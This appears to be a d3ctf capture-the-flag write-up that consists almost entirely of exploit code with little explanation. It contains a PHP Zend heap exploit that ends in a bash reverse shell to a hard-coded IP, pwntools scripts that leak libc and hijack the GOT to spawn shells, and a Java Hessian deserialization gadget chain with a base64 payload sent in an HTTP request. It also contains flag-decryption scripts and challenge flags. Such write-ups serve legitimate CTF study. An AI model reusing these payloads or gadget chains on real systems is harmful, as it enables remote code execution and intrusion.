    // 从源码上看，取出一大块内存，分成若干小内存，取第一个返回，剩余的放入free_slot  /* create a linked list of elements from 1 to last */  end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));  heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);  do {    p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);#if ZEND_DEBUG    do {      zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));      dbg->size = 0;    } while (0);#endif    p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);  } while (p != end);
  /* terminate list using NULL */  p->next_free_slot = NULL;#if ZEND_DEBUG    do {      zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));      dbg->size = 0;    } while (0);#endif
  /* return first element */  return bin;}
static zend_always_inline int zend_mm_small_size_to_bin(size_t size){#if 0  int n;                            /*0,  1,  2,  3,  4,  5,  6,  7,  8,  9  10, 11, 12*/  static const int f1[] = { 3,  3,  3,  3,  3,  3,  3,  4,  5,  6,  7,  8,  9};  static const int f2[] = { 0,  0,  0,  0,  0,  0,  0,  4,  8, 12, 16, 20, 24};
  if (UNEXPECTED(size <= 2)) return 0;  n = zend_mm_small_size_to_bit(size - 1);  return ((size-1) >> f1[n]) + f2[n];#else  unsigned int t1, t2;
  if (size <= 64) {    /* we need to support size == 0 ... */    return (size - !!size) >> 3;  } else {    t1 = size - 1;    t2 = zend_mm_small_size_to_bit(t1) - 3;    t1 = t1 >> t2;    t2 = t2 - 3;    t2 = t2 << 2;    return (int)(t1 + t2);  }#endif}
uint32_t bin_data_size[] = {8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384, 448, 512, 640, 768, 896, 1024, 1280, 1536, 1792, 2048, 2560, 3072 ...};
<?phpfunction p64(string $value):
string{    static $p64_table=[        0=>"x00",1=>"x01",2=>"x02",3=>"x03",4=>"x04",5=>"x05",6=>"x06",7=>"x07",8=>"x08",9=>"x09",10=>"x0a",        11=>"x0b",12=>"x0c",13=>"x0d",14=>"x0e",15=>"x0f",16=>"x10",17=>"x11",18=>"x12",19=>"x13",20=>"x14",        21=>"x15",22=>"x16",23=>"x17",24=>"x18",25=>"x19",26=>"x1a",27=>"x1b",28=>"x1c",29=>"x1d",30=>"x1e",        31=>"x1f",32=>"x20",33=>"x21",34=>"x22",35=>"x23",36=>"x24",37=>"x25",38=>"x26",39=>"x27",40=>"x28",        41=>"x29",42=>"x2a",43=>"x2b",44=>"x2c",45=>"x2d",46=>"x2e",47=>"x2f",48=>"x30",49=>"x31",50=>"x32",        51=>"x33",52=>"x34",53=>"x35",54=>"x36",55=>"x37",56=>"x38",57=>"x39",58=>"x3a",59=>"x3b",60=>"x3c",        61=>"x3d",62=>"x3e",63=>"x3f",64=>"x40",65=>"x41",66=>"x42",67=>"x43",68=>"x44",69=>"x45",70=>"x46",        71=>"x47",72=>"x48",73=>"x49",74=>"x4a",75=>"x4b",76=>"x4c",77=>"x4d",78=>"x4e",79=>"x4f",80=>"x50",        81=>"x51",82=>"x52",83=>"x53",84=>"x54",85=>"x55",86=>"x56",87=>"x57",88=>"x58",89=>"x59",90=>"x5a",        91=>"x5b",92=>"x5c",93=>"x5d",94=>"x5e",95=>"x5f",96=>"x60",97=>"x61",98=>"x62",99=>"x63",100=>"x64",        101=>"x65",102=>"x66",103=>"x67",104=>"x68",105=>"x69",106=>"x6a",107=>"x6b",108=>"x6c",109=>"x6d",110=>"x6e",        111=>"x6f",112=>"x70",113=>"x71",114=>"x72",115=>"x73",116=>"x74",117=>"x75",118=>"x76",119=>"x77",120=>"x78",        121=>"x79",122=>"x7a",123=>"x7b",124=>"x7c",125=>"x7d",126=>"x7e",127=>"x7f",128=>"x80",129=>"x81",130=>"x82",        131=>"x83",132=>"x84",133=>"x85",134=>"x86",135=>"x87",136=>"x88",137=>"x89",138=>"x8a",139=>"x8b",140=>"x8c",        141=>"x8d",142=>"x8e",143=>"x8f",144=>"x90",145=>"x91",146=>"x92",147=>"x93",148=>"x94",149=>"x95",150=>"x96",        151=>"x97",152=>"x98",153=>"x99",154=>"x9a",155=>"x9b",156=>"x9c",157=>"x9d",158=>"x9e",159=>"x9f",160=>"xa0",        161=>"xa1",162=>"xa2",163=>"xa3",164=>"xa4",165=>"xa5",166=>"xa6",167=>"xa7",168=>"xa8",169=>"xa9",170=>"xaa",        171=>"xab",172=>"xac",173=>"xad",174=>"xae",175=>"xaf",176=>"xb0",177=>"xb1",178=>"xb2",179=>"xb3",180=>"xb4",        181=>"xb5",182=>"xb6",183=>"xb7",184=>"xb8",185=>"xb9",186=>"xba",187=>"xbb",188=>"xbc",189=>"xbd",190=>"xbe",        191=>"xbf",192=>"xc0",193=>"xc1",194=>"xc2",195=>"xc3",196=>"xc4",197=>"xc5",198=>"xc6",199=>"xc7",200=>"xc8",        201=>"xc9",202=>"xca",203=>"xcb",204=>"xcc",205=>"xcd",206=>"xce",207=>"xcf",208=>"xd0",209=>"xd1",210=>"xd2",        211=>"xd3",212=>"xd4",213=>"xd5",214=>"xd6",215=>"xd7",216=>"xd8",217=>"xd9",218=>"xda",219=>"xdb",220=>"xdc",        221=>"xdd",222=>"xde",223=>"xdf",224=>"xe0",225=>"xe1",226=>"xe2",227=>"xe3",228=>"xe4",229=>"xe5",230=>"xe6",        231=>"xe7",232=>"xe8",233=>"xe9",234=>"xea",235=>"xeb",236=>"xec",237=>"xed",238=>"xee",239=>"xef",240=>"xf0",        241=>"xf1",242=>"xf2",243=>"xf3",244=>"xf4",245=>"xf5",246=>"xf6",247=>"xf7",248=>"xf8",249=>"xf9",250=>"xfa",        251=>"xfb",252=>"xfc",253=>"xfd",254=>"xfe",255=>"xff"    ];    $result = "";    for($i = 0; $i < 8; $i++){        $remainder = $value % 0x100;        $value =  (int)($value/0x100);        $result .= $p64_table[$remainder];    }    return $result;}function u64(string $bytes):
int{    static $u64_table=[        "x00"=>0,"x01"=>1,"x02"=>2,"x03"=>3,"x04"=>4,"x05"=>5,"x06"=>6,"x07"=>7,"x08"=>8,"x09"=>9,"x0a"=>10,        "x0b"=>11,"x0c"=>12,"x0d"=>13,"x0e"=>14,"x0f"=>15,"x10"=>16,"x11"=>17,"x12"=>18,"x13"=>19,"x14"=>20,        "x15"=>21,"x16"=>22,"x17"=>23,"x18"=>24,"x19"=>25,"x1a"=>26,"x1b"=>27,"x1c"=>28,"x1d"=>29,"x1e"=>30,        "x1f"=>31,"x20"=>32,"x21"=>33,"x22"=>34,"x23"=>35,"x24"=>36,"x25"=>37,"x26"=>38,"x27"=>39,"x28"=>40,        "x29"=>41,"x2a"=>42,"x2b"=>43,"x2c"=>44,"x2d"=>45,"x2e"=>46,"x2f"=>47,"x30"=>48,"x31"=>49,"x32"=>50,        "x33"=>51,"x34"=>52,"x35"=>53,"x36"=>54,"x37"=>55,"x38"=>56,"x39"=>57,"x3a"=>58,"x3b"=>59,"x3c"=>60,        "x3d"=>61,"x3e"=>62,"x3f"=>63,"x40"=>64,"x41"=>65,"x42"=>66,"x43"=>67,"x44"=>68,"x45"=>69,"x46"=>70,        "x47"=>71,"x48"=>72,"x49"=>73,"x4a"=>74,"x4b"=>75,"x4c"=>76,"x4d"=>77,"x4e"=>78,"x4f"=>79,"x50"=>80,        "x51"=>81,"x52"=>82,"x53"=>83,"x54"=>84,"x55"=>85,"x56"=>86,"x57"=>87,"x58"=>88,"x59"=>89,"x5a"=>90,        "x5b"=>91,"x5c"=>92,"x5d"=>93,"x5e"=>94,"x5f"=>95,"x60"=>96,"x61"=>97,"x62"=>98,"x63"=>99,"x64"=>100,        "x65"=>101,"x66"=>102,"x67"=>103,"x68"=>104,"x69"=>105,"x6a"=>106,"x6b"=>107,"x6c"=>108,"x6d"=>109,"x6e"=>110,        "x6f"=>111,"x70"=>112,"x71"=>113,"x72"=>114,"x73"=>115,"x74"=>116,"x75"=>117,"x76"=>118,"x77"=>119,"x78"=>120,        "x79"=>121,"x7a"=>122,"x7b"=>123,"x7c"=>124,"x7d"=>125,"x7e"=>126,"x7f"=>127,"x80"=>128,"x81"=>129,"x82"=>130,        "x83"=>131,"x84"=>132,"x85"=>133,"x86"=>134,"x87"=>135,"x88"=>136,"x89"=>137,"x8a"=>138,"x8b"=>139,"x8c"=>140,        "x8d"=>141,"x8e"=>142,"x8f"=>143,"x90"=>144,"x91"=>145,"x92"=>146,"x93"=>147,"x94"=>148,"x95"=>149,"x96"=>150,        "x97"=>151,"x98"=>152,"x99"=>153,"x9a"=>154,"x9b"=>155,"x9c"=>156,"x9d"=>157,"x9e"=>158,"x9f"=>159,"xa0"=>160,        "xa1"=>161,"xa2"=>162,"xa3"=>163,"xa4"=>164,"xa5"=>165,"xa6"=>166,"xa7"=>167,"xa8"=>168,"xa9"=>169,"xaa"=>170,        "xab"=>171,"xac"=>172,"xad"=>173,"xae"=>174,"xaf"=>175,"xb0"=>176,"xb1"=>177,"xb2"=>178,"xb3"=>179,"xb4"=>180,        "xb5"=>181,"xb6"=>182,"xb7"=>183,"xb8"=>184,"xb9"=>185,"xba"=>186,"xbb"=>187,"xbc"=>188,"xbd"=>189,"xbe"=>190,        "xbf"=>191,"xc0"=>192,"xc1"=>193,"xc2"=>194,"xc3"=>195,"xc4"=>196,"xc5"=>197,"xc6"=>198,"xc7"=>199,"xc8"=>200,        "xc9"=>201,"xca"=>202,"xcb"=>203,"xcc"=>204,"xcd"=>205,"xce"=>206,"xcf"=>207,"xd0"=>208,"xd1"=>209,"xd2"=>210,        "xd3"=>211,"xd4"=>212,"xd5"=>213,"xd6"=>214,"xd7"=>215,"xd8"=>216,"xd9"=>217,"xda"=>218,"xdb"=>219,"xdc"=>220,        "xdd"=>221,"xde"=>222,"xdf"=>223,"xe0"=>224,"xe1"=>225,"xe2"=>226,"xe3"=>227,"xe4"=>228,"xe5"=>229,"xe6"=>230,        "xe7"=>231,"xe8"=>232,"xe9"=>233,"xea"=>234,"xeb"=>235,"xec"=>236,"xed"=>237,"xee"=>238,"xef"=>239,"xf0"=>240,        "xf1"=>241,"xf2"=>242,"xf3"=>243,"xf4"=>244,"xf5"=>245,"xf6"=>246,"xf7"=>247,"xf8"=>248,"xf9"=>249,"xfa"=>250,        "xfb"=>251,"xfc"=>252,"xfd"=>253,"xfe"=>254,"xff"=>255    ];    $result = 0;    for($i = 7; $i >= 0; $i--){        $result = $u64_table[$bytes[$i]] + $result * 0x100;    }    return $result;}function hex64(int $value):
string{    static $hex64_table=[        0=>"0",1=>"1",2=>"2",3=>"3",4=>"4",5=>"5",6=>"6",7=>"7",8=>"8",9=>"9",10=>"a",        11=>"b",12=>"c",13=>"d",14=>"e",15=>"f"    ];    $result = "";    for($i = 0; $i < 16; $i++){        $remainder = $value % 0x10;        $value =  (int)($value/0x10);        $result = $hex64_table[$remainder] . $result;    }    return "0x" . $result;}
echo "Step Onen";
addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");addHacker("ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc", "ddddddddddddddddddddddddddddddddddddddddddddddd");
removeHacker(0);addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");addHacker("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
echo "Step Twon";
$heap_addr = (u64(displayHacker(1)) - 0x72240) & 0xfffffffffffff000;
echo "heap_addr: ". hex64($heap_addr)."n";
editHacker(1, p64($heap_addr+0x1010));$libphp_so_addr = u64(displayHacker(3)) - 0xf8da60;
echo "libphp_so_addr: ". hex64($libphp_so_addr)."n";
editHacker(1, p64($libphp_so_addr+0x101C130));$libc_so_6_addr = u64(displayHacker(3)) - 0x525b0;
echo "libc_so_6_addr: ". hex64($libc_so_6_addr)."n";
editHacker(1, p64($libphp_so_addr+0x101E760));$_emalloc_got_addr = u64(displayHacker(3));
echo "_emalloc_got_addr: ". hex64($_emalloc_got_addr)."n";
echo "Step Threen";
editHacker(3, p64($libc_so_6_addr + 0x4c490));
editHacker(1, p64($heap_addr+0x80100));
editHacker(3, "bash -c 'sh >& /dev/tcp/110.42.237.28/60105 0>&1' ");
echo "Endn";
?>
    #include <stdint.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <fcntl.h>
    #define FLAG_PREFIX "d3ctf{"#define FLAG_PREFIX_LENGTH (sizeof(FLAG_PREFIX)-1)#define FLAG_SUFFIX "}"#define FLAG_SUFFIX_LENGTH (sizeof(FLAG_SUFFIX)-1)#define LIBC_NAME "libc"
char maps[0x1000], flag[0x100];
uint64_t libc_code_addr_start, libc_code_addr_end;
void write_mem(uint64_t addr, uint8_t byte) {  int fd = open("/proc/self/mem", O_RDWR);  lseek(fd, addr, SEEK_SET);  write(fd, &byte, 1);  close(fd);}
void init() {  setvbuf(stdin, NULL, _IONBF, 0);  setvbuf(stdout, NULL, _IONBF, 0);  setvbuf(stderr, NULL, _IONBF, 0);
  FILE* maps_stream = fopen("/proc/self/maps", "r");
  int count = 1;  char *line = NULL;  uint64_t len = 0;  uint64_t addr_start = 0, addr_end = 0, offset = 0, major_id = 0, minor_id = 0, inode_id = 0;  char mode[0x10], file_path[0x100];  memset(mode, 0, sizeof(mode));  memset(file_path, 0, sizeof(file_path));
  while (getline(&line, &len, maps_stream) != -1 ) {    sscanf(line,"%lx-%lx%s%lx%lu:%lu%lu%s",      &addr_start, &addr_end, mode, &offset,      &major_id, &minor_id, &inode_id, file_path    );    if (count == 10) {      libc_code_addr_start = addr_start;      libc_code_addr_end = addr_end;      break;    }    count++;  }
  if (line) {    printf("%s", line);    free(line);  }  fclose(maps_stream);
  int fd = open("/flag", O_RDONLY);  read(fd, flag, 0x100);  close(fd);}
int main(int argc, char *argv[]) {  init();
  uint64_t addr = 0;  uint offset = 0;
  printf("flag: "FLAG_PREFIX"[a-f0-9]{%lu}"FLAG_SUFFIX"n", strlen(flag) - FLAG_PREFIX_LENGTH - FLAG_SUFFIX_LENGTH);
  while (scanf("%lu%u", &addr, &offset) == 2) {    if (!(libc_code_addr_start <= addr && addr < libc_code_addr_end) ||        !(offset >= FLAG_PREFIX_LENGTH && offset < strlen(flag) - FLAG_SUFFIX_LENGTH))      break;
    write_mem(addr, flag[offset]);  }
  return 0;}
.text:
000000000011B280                   write           proc near               ; CODE XREF: .text:
00000000000282E5↑j.text:
000000000011B280                                                           ; start+1B↑p ....text:
000000000011B280.text:
000000000011B280                   fd              = qword ptr -20h.text:
000000000011B280                   buf             = qword ptr -18h.text:
000000000011B280                   count           = qword ptr -10h.text:
000000000011B280.text:
000000000011B280                   ; __unwind {.text:
000000000011B280 F3 0F 1E FA                       endbr64                 ; Alternative name is '__write'.text:
000000000011B284 80 3D B5 B2 0E 00                 cmp     cs:
__libc_single_threaded, 0.text:
000000000011B284 00.text:
000000000011B28B 74 13                             jz      short loc_11B2A0.text:
000000000011B28D B8 01 00 00 00                    mov     eax, 1.text:
000000000011B292 0F 05                             syscall                 ; LINUX - sys_write.text:
000000000011B294 48 3D 00 F0 FF FF                 cmp     rax, 0FFFFFFFFFFFFF000h.text:
000000000011B29A 77 54                             ja      short loc_11B2F0.text:
000000000011B29C C3                                retn.text:
000000000011B29C                   ; ---------------------------------------------------------------------------.text:
000000000011B29D 0F 1F 00                          align 20h.text:
000000000011B2A0.text:
000000000011B2A0                   loc_11B2A0:                             ; CODE XREF: write+B↑j.text:
000000000011B2A0 48 83 EC 28                       sub     rsp, 28h.text:
000000000011B2A4 48 89 54 24 18                    mov     [rsp+28h+count], rdx.text:
000000000011B2A9 48 89 74 24 10                    mov     [rsp+28h+buf], rsi.text:
000000000011B2AE 89 7C 24 08                       mov     dword ptr [rsp+28h+fd], edi.text:
000000000011B2B2 E8 39 86 F7 FF                    call    sub_938F0.text:
000000000011B2B7 48 8B 54 24 18                    mov     rdx, [rsp+28h+count] ; count.text:
000000000011B2BC 48 8B 74 24 10                    mov     rsi, [rsp+28h+buf] ; buf.text:
000000000011B2C1 41 89 C0                          mov     r8d, eax.text:
000000000011B2C4 8B 7C 24 08                       mov     edi, dword ptr [rsp+28h+fd] ; fd.text:
000000000011B2C8 B8 01 00 00 00                    mov     eax, 1.text:
000000000011B2CD 0F 05                             syscall                 ; LINUX - sys_write.text:
000000000011B2CF 48 3D 00 F0 FF FF                 cmp     rax, 0FFFFFFFFFFFFF000h.text:
000000000011B2D5 77 31                             ja      short loc_11B308.text:
000000000011B2D7.text:
000000000011B2D7                   loc_11B2D7:                             ; CODE XREF: write+9B↓j.text:
000000000011B2D7 44 89 C7                          mov     edi, r8d.text:
000000000011B2DA 48 89 44 24 08                    mov     [rsp+28h+fd], rax.text:
000000000011B2DF E8 8C 86 F7 FF                    call    sub_93970.text:
000000000011B2E4 48 8B 44 24 08                    mov     rax, [rsp+28h+fd].text:
000000000011B2E9 48 83 C4 28                       add     rsp, 28h.text:
000000000011B2ED C3                                retn
#!/usr/bin/env python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('47.103.122.127', 30815)
libc_addr = int(sh.recvuntil(b'-', drop=True), 16) - 0x26000success('libc_addr: ' + hex(libc_addr))
sh.sendline(f'{libc_addr + 0x11B286} {7}'.encode())sh.sendline(f'{libc_addr + 0x11B2C7} {7}'.encode())
for i in range(41):    sh.sendline(f'{libc_addr + 0x26000} {6+i}'.encode())
print(sh.recvrepeat(1).decode())
sh.interactive()
from pwn import *# io = process("./pwn")io = remote("139.224.62.61", 32739)elf = ELF("./pwn")libc = elf.libc
def menu(n):    io.sendline(str(n).encode())
def add(idx, size, con = b"/bin/sh"):    menu(0x114)    io.sendline(str(idx).encode())    io.sendline(str(size).encode())    io.sendline(con)
def show(idx):    menu(0x514)    io.sendline(str(idx).encode())

def edit(idx, con):    menu(0x810)    io.sendline(str(idx).encode())    io.sendline(con)
def delete(idx):    menu(0x1919)    io.sendline(str(idx).encode())
add(0, 0x10)
show(-0x39f)libcbase = u64(io.recv(6).ljust(8, b"x00")) - libc.sym['setbuf']print(f"libcbase: ", hex(libcbase))system = libcbase + libc.sym['system']
stdout = libcbase + 0x1d4780edit(-0x5b7, p64(stdout) + p64(elf.got['free']))edit(-4, p64(system))delete(0)io.interactive()#d3ctf{dd6becd3b8e0a75696cdefa1796fc1ae85c066d9}
int main(){  unsigned char input[] =  {    0x9D, 0x6B, 0xA1, 0x02, 0xD7, 0xED, 0x40, 0xF6, 0x0E, 0xAE,    0x84, 0x19  };  unsigned char input22[] = "x4ex24xc0x64x17x60xc4x67x5ex29x5ex9b";  for (int i = 11; i > 0; i--)  {    input[i] ^= input[i - 1];  }  input[11] ^= 7;  input[11] = (input[11] << 7) | (input[11]  >> 1);
  input[10] ^= input[11];  input[10] = (input[10] << 4) | (input[10] >> 4);
  input[9] ^= input[10];  input[9] = (input[9] << 4) | (input[9] >> 4);
  input[8] ^= input[9];  input[8] = (input[8] << 2) | (input[8] >> 6);
  input[7] ^= input[8];  input[7] = (input[7] << 7) | (input[7] >> 1);
  input[6] ^= input[7];  input[6] ^= 7;  input[6] = (input[6] << 7) | (input[6] >> 1);
  input[5] ^= input[6];  input[5] = (input[5] << 4) | (input[5] >> 4);
  input[4] ^= input[5];  input[4] ^= 4;  input[4] = (input[4] << 4) | (input[4] >> 4);
  input[3] ^= input[4];  input[3] ^= 0x7;  input[3] = (input[3] << 7) | (input[3] >> 1);
  input[2] ^= input[3];  input[2] = (input[2] << 6) | (input[2] >> 2);
  input[1] ^= input[2];  input[1] = (input[1] << 5) | (input[1] >> 3);
  input[0] ^= input[1];  input[0] ^= 3;  input[0] = (input[0] << 3) | (input[0] >> 5);}
from pwn import *
sc=open("shellcode.txt","rb").read()flag_bin=""sc_len=len(sc)
i=0flag1=1flag2=1flag3=1flag4=1flag5=1while len(flag_bin)<(17*8):    print(sc[i+0xe:i+0xe+4])    idx1=u32(sc[i+0xe:i+0xe+4])    idx2=u32(sc[i+0x19:i+0x19+4])    idx3=u32(sc[i+0x25:i+0x25+4])    idx4=u32(sc[i+0x30:i+0x30+4])    print(f"{hex(idx1)} {hex(idx2)} {hex(idx3)} {hex(idx4)}")    target1=(idx1+17*(idx2))*64    target12=sc[target1:
target1+1]    target2=(idx3+17*(idx4))*64    target22=sc[target2:
target2+1]
    if flag1:        if (1,0xd) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag1=0            print("path 2")            continue
    if flag2:        if (0xf,0xd) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag2=0            print("path 2")            continue
    if flag3:        if (0x5,2) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag3=0            print("path 2")            continue    if flag4:        if (8,0xb) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag4=0            print("path 2")            continue    if flag5:        if (2,16) == (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4])):            i=target2            flag_bin+="1"            flag5=0            print("path 2")            continue    if (u32(sc[i+0xe:i+0xe+4]),u32(sc[i+0x19:i+0x19+4]))==(u32(sc[target1+0xe:
target1+0xe+4]),u32(sc[target1+0x19:
target1+0x19+4])):        i=target2        flag_bin+="1"        print("path 2")        continue

    if b"xb8" in target12:        flag_bin+="0"        i=target1        print("path 1")    elif b"xcd" in target22:        flag_bin+="0"        i=target1        print("path 1")    else:        i=target2        flag_bin+="1"        print("path 2")    print(flag_bin)  
print(flag_bin)
from ctypes import * from libnum import *def encrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    sum1=c_uint32(0xE8017300)    delta=0xFF58F981    for i in range(32):        v0.value+=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])^0x44        v1.value+=(((v0.value<<5)^(v0.value>>6))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])^0x33        sum1.value-=delta    return v0.value,v1.value
def decrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    delta=0xFF58F981    sum1=c_uint32(0xE8017300-delta*32)    for i in range(32):        sum1.value+=delta        v1.value-=(((v0.value<<5)^(v0.value>>6))+v0.value)^(sum1.value+k[(sum1.value>>11)&3])^0x33        v0.value-=(((v1.value<<4)^(v1.value>>5))+v1.value)^(sum1.value+k[sum1.value&3])^0x44    return v0.value,v1.value

a=[get_wide_dword(0x404360+i*4) for i in range(8)]k=[0x5454,0x4602,0x4477,0x5e5e]flag=b''for i in range(4):    res=decrypt(a[i*2:i*2+2],k)    flag+=n2s(res[0])[::-1]    flag+=n2s(res[1])[::-1]print(flag.decode())
printf("hellv1[0] = 0xB6DDB3A9;v1[1] = 0x36162C23;v1[2] = 0x1889FABF;v1[3] = 0x6CE4E73B;v1[4] = 0xA5AF8FC;v1[5] = 0x21FF8415;v1[6] = 0x44859557;v1[7] = 0x2DC227B7; o world!");
void fdec(char *flag){    uint32_t dq_key = 0x84A6972F;
    uint32_t p;    int j, i;    for (i = 0; i < 8; i++)    {        p = *((uint32_t*)&flag[i * 4]);        for (j = 0; j < 32; j++)        {            if (p & 1)            {                p = ((uint32_t)p ^ dq_key) >> 1;                p |= 0x80000000;
            }            else            {                p = (uint32_t)p >> 1;            }        }        *((uint32_t*)&flag[i * 4]) = p;    }    for (i = 0; i < 48; i++)        printf("0x%x,", flag[i] & 0xff);    printf("n");    return;}
3710139819,2307229656,3137309,197438626,1298702698,1634491689,1536236277,1282871516,
a=[3710139819,2307229656,3137309,197438626,1298702698,1634491689,1536236277,1282871516,]k=[0x5454,0x4602,0x4477,0x5e5e]flag=b''for i in range(4):    res=decrypt(a[i*2:i*2+2],k)    flag+=n2s(res[0])[::-1]    flag+=n2s(res[1])[::-1]print(flag.decode())
d3ctf{ea3yjunk_c0d3_4nd_ea5y_re}
import com.caucho.hessian.io.Hessian2Input;  import com.caucho.hessian.io.Hessian2Output;  import com.caucho.hessian.io.HessianInput;  import com.caucho.hessian.io.HessianOutput;  import com.sun.org.apache.bcel.internal.Repository;  import com.sun.org.apache.bcel.internal.classfile.JavaClass;  import com.sun.org.apache.bcel.internal.classfile.Utility;  import sun.reflect.ReflectionFactory;  import sun.security.pkcs.PKCS9Attribute;  import sun.security.pkcs.PKCS9Attributes;  import sun.swing.SwingLazyValue;    import javax.swing.*;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.lang.reflect.Constructor;  import java.lang.reflect.Field;  import java.lang.reflect.InvocationTargetException;  import java.util.Base64;    public class Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper {      public static void main(String[] args) throws Exception {          PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);          UIDefaults uiDefaults = new UIDefaults();          JavaClass evil = Repository.lookupClass(Calc.class);          String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);            uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));            setFieldValue(s,"attributes",uiDefaults);            ByteArrayOutputStream baos = new ByteArrayOutputStream();          Hessian2Output out = new Hessian2Output(baos);          baos.write(67);          out.getSerializerFactory().setAllowNonSerializable(true);          out.writeObject(s);          out.flushBuffer();          System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));          ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());          Hessian2Input input = new Hessian2Input(bais);          input.readObject();      }        public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {          return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);      }        public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {          Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);          objCons.setAccessible(true);          Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);          sc.setAccessible(true);          return (T) sc.newInstance(consArgs);      }      public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {          Field field = obj.getClass().getDeclaredField(fieldName);          field.setAccessible(true);          field.set(obj, value);      }  }
POST /api/agent/record/save HTTP/1.1Host: 106.54.28.21:
9999Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Origin: http://192.168.0.105:
8000Accept: application/json, text/plain, */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0Content-Type: application/jsonReferer: http://192.168.0.105:
8000/Content-Length: 80
Q0MwIXN1bi5zZWN1cml0eS5wa2NzLlBLQ1M5QXR0cmlidXRlc5QbaWdub3JlVW5zdXBwb3J0ZWRB
dHRyaWJ1dGVzCmF0dHJpYnV0ZXMTcGVybWl0dGVkQXR0cmlidXRlcwtkZXJFbmNvZGluZ2BGTRZq
YXZheC5zd2luZy5VSURlZmF1bHRzQzAic3VuLnNlY3VyaXR5LnV0aWwuT2JqZWN0SWRlbnRpZmll
cpMMY29tcG9uZW50TGVuCGVuY29kaW5nCmNvbXBvbmVudHNhjykqhkiG9w0BCQFOQxhzdW4uc3dp
bmcuU3dpbmdMYXp5VmFsdWWTCWNsYXNzTmFtZQptZXRob2ROYW1lBGFyZ3NiMDFjb20uc3VuLm9y
Zy5hcGFjaGUuYmNlbC5pbnRlcm5hbC51dGlsLkphdmFXcmFwcGVyBV9tYWlucQdbb2JqZWN0cQdb
c3RyaW5nUwQTJCRCQ0VMJCQkbCQ4YiRJJEEkQSRBJEEkQSRBJEFtUSRkYk4kZGIkNDAkUSQzZCQ5
YjhxJGUyJGckQyRhNiQ0MEskODAkOWEkNWVSJGE3JHdxUiRhNVUkYWIkYTAkYmMkbSQ5MCQ5MCR5
JGE4JGVhJDhhJHckZWFDJGI1MSRhYiRiMCR1JGIxJDkxJGVkRCRmY1ZfWiQ4NEQkM2YkODAkOGZC
JDlkJE4kODhwJDViaSRlN3gkY2UkY2MkOWMkWiRjZiQ1ZSQ1YyQ5ZSRmZCREJGQwRCRkNSQ0MCRS
